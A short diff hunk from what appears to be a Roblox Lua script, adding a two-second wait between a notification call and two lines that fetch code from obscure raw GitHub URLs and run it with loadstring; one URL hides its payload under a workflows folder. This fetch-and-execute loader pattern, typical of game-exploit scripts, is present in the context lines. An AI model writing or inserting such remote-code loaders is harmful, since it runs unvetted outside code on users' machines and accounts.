@@ -1989,4 +1989,5 @@ StarterGui:SetCore("SendNotification", {
 })
 task.wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"))()
+task.wait(2)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ffbbsndv/Ehheheheje/refs/heads/main/.github/workflows/Nametag.txt"))()
